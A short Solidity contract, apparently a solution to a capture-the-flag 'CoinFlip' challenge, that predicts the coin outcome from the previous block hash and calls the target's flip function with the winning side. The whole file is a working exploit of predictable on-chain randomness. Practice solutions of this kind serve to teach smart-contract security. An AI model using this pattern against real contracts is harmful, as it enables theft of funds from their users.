// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "./CoinFlip.sol";

contract CoinFlipHack {
    CoinFlip public challenge;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address challengeAddress) {
        challenge = CoinFlip(payable(challengeAddress));
    }

    function attack() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }

    fallback() external payable {}
}
